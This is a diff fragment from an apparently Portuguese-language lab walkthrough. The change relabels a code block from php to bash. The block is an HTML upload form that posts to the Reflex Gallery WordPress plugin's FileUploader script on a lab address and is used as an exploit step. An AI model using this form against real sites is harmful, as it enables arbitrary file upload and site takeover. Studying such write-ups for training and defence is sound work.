@@ -79,7 +79,7 @@ Que ao ser acessado, retorna um erro dizendo que não tem arquivos carregados, e
 
 Como não achamos o lugar para fazer o upload, no exploit tem o código de um formulário que poderemos usar para o isso.
 
-```php
+```bash
 <form method="POST" action="http://192.168.56.10/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php" enctype="multipart/form-data" >
     <input type="file" name="qqfile"><br>
     <input type="submit" name="Submit" value="Pwn!">
